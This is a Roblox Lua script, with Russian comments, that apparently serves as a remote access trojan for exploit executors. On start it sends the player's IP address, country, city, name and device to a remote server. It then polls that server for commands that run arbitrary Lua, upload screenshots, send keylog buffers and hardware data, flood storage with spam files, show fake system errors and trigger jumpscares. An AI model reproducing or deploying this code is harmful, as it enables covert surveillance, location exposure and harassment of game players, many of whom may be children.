local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

local SERVER_URL = "https://ratserver-6wo3.onrender.com"
local player = Players.LocalPlayer

local keyloggerEnabled = false
local keylogBuffer = ""
local lastSendTime = os.time()
local lastUserUpdate = 0

-- ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
local function httpRequest(params)
    local requestFunc = (syn and syn.request) or (request) or (http and http.request)
    if not requestFunc then return nil end
    
    local success, response = pcall(requestFunc, params)
    return success and response or nil
end

local function getDeviceType()
    if UserInputService.TouchEnabled then
        if UserInputService.MouseEnabled then
            return "Tablet"
        else
            return "Mobile"
        end
    else
        return "PC"
    end
end

local function sendInjectNotification()
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local ipData = "N/A"
    local ipResponse = httpRequest({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    
    if ipResponse and ipResponse.Body then
        local success, ipInfo = pcall(function()
            return HttpService:JSONDecode(ipResponse.Body)
        end)
        if success and ipInfo and ipInfo.status ~= "fail" then
            ipData = string.format(
                "IP: %s\nCountry: %s\nCity: %s",
                ipInfo.query or "N/A",
                ipInfo.country or "N/A", 
                ipInfo.city or "N/A"
            )
        end
    end

    local executor = "Unknown"
    if identifyexecutor then
        local success, exec = pcall(identifyexecutor)
        if success then
            executor = exec
        end
    end
    
    local deviceType = getDeviceType()
    
    httpRequest({
        Url = SERVER_URL.."/command",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            command = "inject_notify",
            args = {playerName, placeName, ipData, executor, deviceType}
        })
    })
end

local function sendUserInfo()
    local currentTime = os.time()
    if currentTime - lastUserUpdate < 15 then return end
    
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local executor = "Unknown"
    if identifyexecutor then
        local success, exec = pcall(identifyexecutor)
        if success then executor = exec end
    end
    
    local deviceType = getDeviceType()
    
    pcall(function()
        httpRequest({
            Url = SERVER_URL.."/users",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                player = playerName,
                place = placeName,
                executor = executor,
                device = deviceType
            })
        })
    end)
    
    lastUserUpdate = currentTime
end

local function showPopupMessage(message)
    pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "PopupMessage"
        gui.Parent = player:WaitForChild("PlayerGui")
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.4, 0, 0.2, 0)
        frame.Position = UDim2.new(0.3, 0, 0.4, 0)
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
        frame.BorderColor3 = Color3.fromRGB(70, 70, 100)
        frame.BorderSizePixel = 2
        frame.Parent = gui
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
        textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
        textLabel.Text = "📢 Сообщение:\n\n"..message
        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.Gotham
        textLabel.BackgroundTransparency = 1
        textLabel.Parent = frame
        
        frame.BackgroundTransparency = 1
        textLabel.TextTransparency = 1
        
        local tweenIn = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0.1})
        local tweenTextIn = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 0})
        
        tweenIn:Play()
        tweenTextIn:Play()
        
        task.delay(7, function()
            local tweenOut = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
            local tweenTextOut = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 1})
            
            tweenOut:Play()
            tweenTextOut:Play()
            
            task.delay(0.6, function()
                pcall(function() gui:Destroy() end)
            end)
        end)
    end)
end

local function getHardwareInfo()
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local ipData = "N/A"
    local ipResponse = httpRequest({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    
    if ipResponse and ipResponse.Body then
        local success, ipInfo = pcall(function()
            return HttpService:JSONDecode(ipResponse.Body)
        end)
        if success and ipInfo and ipInfo.status ~= "fail" then
            ipData = string.format(
                "IP: %s\nCountry: %s",
                ipInfo.query or "N/A",
                ipInfo.country or "N/A"
            )
        end
    end

    local fps = 0
    local ping = 0
    
    local success1, fpsValue = pcall(function()
        return math.floor(workspace:GetRealPhysicsFPS())
    end)
    if success1 then fps = fpsValue end
    
    local success2, pingValue = pcall(function()
        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
    end)
    if success2 then ping = pingValue end

    local executor = "Unknown"
    if identifyexecutor then
        local success, exec = pcall(identifyexecutor)
        if success then
            executor = exec
        end
    end

    local systemInfo = {
        device_type = getDeviceType(),
        touch_enabled = UserInputService.TouchEnabled,
        mouse_enabled = UserInputService.MouseEnabled,
        keyboard_enabled = UserInputService.KeyboardEnabled,
        screen_size = workspace.CurrentCamera.ViewportSize
    }

    local hardwareData = {
        player = playerName,
        game = placeName,
        fps = fps,
        ping = ping,
        executor = executor,
        ip_info = ipData,
        system = systemInfo
    }
    
    return hardwareData
end

local function memorySpam(fileCount)
    if not writefile then return 0 end
    
    local successCount = 0
    
    for i = 1, fileCount do
        local filename = "spam_file_" .. i .. "_" .. math.random(1000, 9999) .. ".txt"
        
        local success = pcall(function()
            local bigContent = ""
            for j = 1, 100 do
                bigContent = bigContent .. "SPAM_" .. math.random(100000, 999999) .. "_" .. 
                           string.rep("X", 100) .. "\n"
            end
            
            writefile(filename, bigContent)
            return true
        end)
        
        if success then
            successCount = successCount + 1
        end
        
        task.wait(0.1)
    end
    
    return successCount
end

local function executeLua(code)
    local func, err = loadstring(code)
    if func then
        local success, result = pcall(func)
        return success and "Success" or "Error: " .. tostring(result)
    else
        return "Compile error: " .. tostring(err)
    end
end

local function showFakeError(message)
    pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "FakeError"
        gui.Parent = player:WaitForChild("PlayerGui")
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.5, 0, 0.3, 0)
        frame.Position = UDim2.new(0.25, 0, 0.35, 0)
        frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
        frame.BorderColor3 = Color3.fromRGB(255, 85, 85)
        frame.Parent = gui
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
        textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
        textLabel.Text = "⚠ ОШИБКА СИСТЕМЫ ⚠\n\n"..message
        textLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.GothamBold
        textLabel.BackgroundTransparency = 1
        textLabel.Parent = frame
        
        task.delay(10, function()
            pcall(function() gui:Destroy() end)
        end)
    end)
end

local function jeffKillerJumpscare()
    pcall(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "JumpscareUI"
        screenGui.Parent = player:WaitForChild("PlayerGui")
        screenGui.ResetOnSpawn = false
        screenGui.IgnoreGuiInset = true
        
        local jeffImage = Instance.new("ImageLabel")
        jeffImage.Size = UDim2.new(1, 0, 1, 0)
        jeffImage.Position = UDim2.new(0, 0, 0, 0)
        jeffImage.BackgroundTransparency = 1
        jeffImage.ImageTransparency = 1
        jeffImage.ScaleType = Enum.ScaleType.Crop
        jeffImage.ZIndex = 1000
        jeffImage.Image = "rbxassetid://15308155008"
        jeffImage.Parent = screenGui
        
        local warningSound = Instance.new("Sound")
        warningSound.SoundId = "rbxassetid://18379039436"
        warningSound.Volume = 0.9
        warningSound.Parent = screenGui
        warningSound:Play()
        
        task.wait(5)
        
        local jeffScream = Instance.new("Sound")
        jeffScream.SoundId = "rbxassetid://112005418834382"
        jeffScream.Volume = 2.2
        jeffScream.Parent = screenGui
        
        jeffImage.ImageTransparency = 0
        jeffScream:Play()
        
        for i = 1, 25 do
            jeffImage.Rotation = math.random(-15, 15)
            jeffImage.Position = UDim2.new(0, math.random(-60, 60), 0, math.random(-60, 60))
            task.wait(0.02)
        end
        
        local fadeOut = TweenService:Create(jeffImage, TweenInfo.new(1.5), {ImageTransparency = 1})
        fadeOut:Play()
        
        task.wait(1.6)
        pcall(function() screenGui:Destroy() end)
    end)
end

local function sonicExeJumpscare()
    pcall(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "JumpscareUI"
        screenGui.Parent = player:WaitForChild("PlayerGui")
        screenGui.ResetOnSpawn = false
        screenGui.IgnoreGuiInset = true
        
        local sonicImage = Instance.new("ImageLabel")
        sonicImage.Size = UDim2.new(1, 0, 1, 0)
        sonicImage.Position = UDim2.new(0, 0, 0, 0)
        sonicImage.BackgroundTransparency = 1
        sonicImage.ImageTransparency = 1
        sonicImage.ScaleType = Enum.ScaleType.Crop
        sonicImage.ZIndex = 1000
        sonicImage.Image = "rbxassetid://13099898470"
        sonicImage.Parent = screenGui
        
        local errorSound = Instance.new("Sound")
        errorSound.SoundId = "rbxassetid://184702873"
        errorSound.Volume = 0.8
        errorSound.Parent = screenGui
        errorSound:Play()
        
        task.wait(1.5)
        
        local sonicScream = Instance.new("Sound")
        sonicScream.SoundId = "rbxassetid://112005418834382"
        sonicScream.Volume = 2.0
        sonicScream.Parent = screenGui
        
        sonicImage.ImageTransparency = 0
        sonicScream:Play()
        
        for i = 1, 30 do
            sonicImage.ImageColor3 = Color3.fromRGB(
                math.random(200, 255),
                math.random(0, 100),
                math.random(0, 100)
            )
            
            sonicImage.Rotation = math.random(-20, 20)
            sonicImage.Position = UDim2.new(
                0, math.random(-80, 80),
                0, math.random(-80, 80)
            )
            
            local scale = 0.9 + math.random() * 0.3
            sonicImage.Size = UDim2.new(scale, 0, scale, 0)
            
            task.wait(0.02)
        end
        
        local sonicFade = TweenService:Create(sonicImage, TweenInfo.new(2), {ImageTransparency = 1})
        sonicFade:Play()
        
        task.wait(2.1)
        pcall(function() screenGui:Destroy() end)
    end)
end

-- ========== ФУНКЦИЯ ВЫПОЛНЕНИЯ КОМАНД ==========
local function ExecuteCommand(cmd, args)
    pcall(function()
        if cmd == "popup" then
            if args and args[1] then
                showPopupMessage(args[1])
            end
        
        elseif cmd == "kick" then
            player:Kick(args[1] or "Kicked by admin")
        
        elseif cmd == "freeze" then
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = 0
                task.delay(tonumber(args[1] or 5), function()
                    if humanoid then humanoid.WalkSpeed = 16 end
                end)
            end
        
        elseif cmd == "void" then
            local character = player.Character or player.CharacterAdded:Wait()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                root.CFrame = CFrame.new(0, -5000, 0)
            end
        
        elseif cmd == "spin" then
            local character = player.Character or player.CharacterAdded:Wait()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                for i = 1, 20 do
                    if root then
                        root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(30), 0)
                        task.wait(0.1)
                    end
                end
            end
        
        elseif cmd == "fling" then
            local character = player.Character or player.CharacterAdded:Wait()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                root.Velocity = Vector3.new(0, 5000, 0)
            end
        
        elseif cmd == "blur" then
            local blur = Instance.new("BlurEffect")
            blur.Size = 24
            blur.Parent = Lighting
            task.delay(tonumber(args[1] or 5), function()
                pcall(function() if blur then blur:Destroy() end end)
            end)
        
        elseif cmd == "execute" then
            local code = table.concat(args, " ")
            local func, err = loadstring(code)
            if func then pcall(func) end
        
        elseif cmd == "fakeerror" then
            showFakeError(table.concat(args, " "))
        
        elseif cmd == "screenshot" then
            local screenshotData = nil
            if getgenv and getgenv().takescreenshot then
                screenshotData = getgenv().takescreenshot()
            elseif screencap then
                screenshotData = screencap()
            end
            
            if screenshotData then
                local success, encoded = pcall(function()
                    return HttpService:JSONEncode(screenshotData)
                end)
                if success then
                    httpRequest({
                        Url = SERVER_URL.."/screenshot",
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode({ image = encoded })
                    })
                end
            end
        
        elseif cmd == "keylog" then
            keyloggerEnabled = true
            keylogBuffer = ""
            lastSendTime = os.time()
        
        elseif cmd == "stopkeylog" then
            keyloggerEnabled = false
            if keylogBuffer ~= "" then
                httpRequest({
                    Url = SERVER_URL.."/keylog",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({ logs = keylogBuffer })
                })
            end
            keylogBuffer = ""
        
        elseif cmd == "hardware" then
            local hwInfo = getHardwareInfo()
            httpRequest({
                Url = SERVER_URL.."/hardware",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    player = player.Name,
                    data = hwInfo
                })
            })
        
        elseif cmd == "memory_spam" then
            local fileCount = tonumber(args[1]) or 50
            task.spawn(function()
                local savedCount = memorySpam(fileCount)
                httpRequest({
                    Url = SERVER_URL.."/command",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        command = "spam_completed",
                        args = {"memory_spam", "Создано "..savedCount.." файлов из "..fileCount}
                    })
                })
            end)
        
        elseif cmd == "jumpscare" then
            local scareType = tonumber(args[1]) or 1
            task.spawn(function()
                if scareType == 1 then
                    jeffKillerJumpscare()
                else
                    sonicExeJumpscare()
                end
            end)
        end
    end)
end

local function checkCommands()
    local success, response = pcall(function()
        return httpRequest({
            Url = SERVER_URL.."/data?player=" .. player.Name,
            Method = "GET"
        })
    end)
    
    if success and response and response.Body then
        local success, data = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        
        if success and data and data.command and data.command ~= "" then
            ExecuteCommand(data.command, data.args or {})
            return true
        end
    end
    return false
end

-- ========== ОСНОВНОЙ ЦИКЛ ==========
task.spawn(function()
    sendInjectNotification()
    sendUserInfo()
    task.wait(15)
    
    while task.wait(15) do
        pcall(sendUserInfo)
        pcall(checkCommands)
        
        if keyloggerEnabled and os.time() - lastSendTime >= 300 then
            if keylogBuffer ~= "" then
                pcall(function()
                    httpRequest({
                        Url = SERVER_URL.."/keylog",
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode({ logs = keylogBuffer })
                    })
                    keylogBuffer = ""
                end)
            end
            lastSendTime = os.time()
        end
    end
end)
